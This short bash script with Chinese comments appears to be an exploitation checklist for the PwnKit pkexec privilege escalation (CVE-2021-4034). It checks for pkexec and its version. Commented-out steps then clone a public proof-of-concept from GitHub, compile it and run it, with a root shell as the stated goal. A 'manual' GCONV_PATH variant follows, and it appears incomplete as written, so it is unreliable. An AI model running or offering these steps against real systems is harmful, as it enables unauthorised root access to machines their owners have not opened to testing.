#!/usr/bin/env bash
echo '--- 前置判定'
ls -la "$(command -v pkexec)" 2>/dev/null || { echo 'no pkexec'; exit 1; }
pkexec --version 2>/dev/null | head -2
echo '--- 拉 PoC 并编译（在你自己的同版本环境先验证）'
# git clone https://github.com/berdav/CVE-2021-4034 /tmp/pwnkit
# cd /tmp/pwnkit && make
# ./cve-2021-4034
# 判定：执行后拿到 uid=0 的 shell
# 手工版（无需编译，靠 GCONV_PATH 与 argv[0] 欺骗）：
#   mkdir -p /tmp/pwn && cd /tmp/pwn
#   printf '#!/bin/sh\nid\n' > pwnkit && chmod +x pwnkit
#   GCONV_PATH=. pkexec --user root pwnkit
